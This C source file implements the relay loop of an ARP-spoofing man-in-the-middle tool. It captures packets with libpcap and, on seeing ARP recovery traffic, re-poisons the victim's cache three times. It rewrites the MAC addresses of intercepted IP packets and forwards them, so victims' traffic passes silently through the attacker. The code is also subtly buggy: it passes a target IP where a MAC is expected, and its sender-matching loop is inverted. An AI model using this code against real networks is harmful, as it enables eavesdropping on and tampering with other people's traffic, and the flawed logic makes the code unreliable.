#include "arp_relay.h"

void arp_relay(char * dev, pcap_t * handle, uint8_t ** Senders_IP, uint8_t ** Targets_IP, uint8_t ** Senders_MAC, uint8_t ** Targets_MAC, int session_cnt)
{
    uint8_t My_MAC[6];
    uint8_t My_IP[4];

    struct pcap_pkthdr* header;
    const u_char* packet;

    /*        Get my IP and Mac          */
    GET_MY_IP_MAC(dev, My_IP, My_MAC);

    while (true)
    {

        printf("while~~~\n");
//        struct pcap_pkthdr* header;
//        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

//        printf("%.3lf\n",clock()/(double)1000);


        ETH_header * eth_h = (ETH_header *)packet;


        //        if (memcmp(My_MAC, eth_h->dmac, 6))
        //        {
        //            printf("not my packet\n");
        //            continue;
        //        }
        int cnt = 1;

        while(cnt<=session_cnt)
        {
            if(!memcmp(Senders_MAC[cnt], eth_h->smac, 6))
                cnt++;
            else
            {
                break;
            }
        }

        if (ntohs(eth_h->type)==ETHERTYPE_ARP) // ARP Recovery -> ARP Re Infection
        {
            printf("Capture ARP Packet\n");
            printf("re infection\n");

            for(int j=0; j<3; j++) // Re Infection count 3
                arp_infection(handle, dev, Senders_IP[cnt], Targets_IP[cnt], Senders_MAC[cnt], Targets_IP[cnt], false);
            continue;
        }

        if (ntohs(eth_h->type)!=ETHERTYPE_IP)
            continue;
        /******************Capture IP Packet********************/

        IP_header * ip_h = (IP_header *)(packet+ETHER_HEADER_SIZE);
        printf("Capture IP Packet\n");
//        printf("%.3lf\n",clock()/(double)1000);
        size_t ip_SIZE = (ip_h->VHL & 0x0F) * 4;
        size_t total_SIZE = ntohs(ip_h->Total_LEN);
        TCP_header * tcp_h = (TCP_header *)(packet + ETHER_HEADER_SIZE + ip_SIZE);
        size_t tcp_SIZE = ((tcp_h->OFF & 0xF0) >> 4) * 4;
        u_char * payload = (u_char*)(packet + ETHER_HEADER_SIZE + ip_SIZE + tcp_SIZE);
        size_t payload_len = (total_SIZE) - (ip_SIZE + tcp_SIZE);
        size_t packet_SIZE = ETHER_HEADER_SIZE + total_SIZE;


        u_char* relay_packet = (u_char*)malloc(sizeof(u_char)*packet_SIZE);


        memcpy(relay_packet, packet, packet_SIZE);



        ETH_header * eth_relay_h = (ETH_header *)relay_packet;

        /*****************************************************/


        /*****************Send relay packet******************/


        memcpy(eth_relay_h->dmac, Targets_MAC[cnt], 6);


        memcpy(eth_relay_h->smac, My_MAC, 6);


        printf("send relay Packet...\n");
        pcap_sendpacket(handle, relay_packet, packet_SIZE);
//        printf("%.3lf\n",clock()/(double)1000);
        /****************************************************/

        free(relay_packet);

    }
}
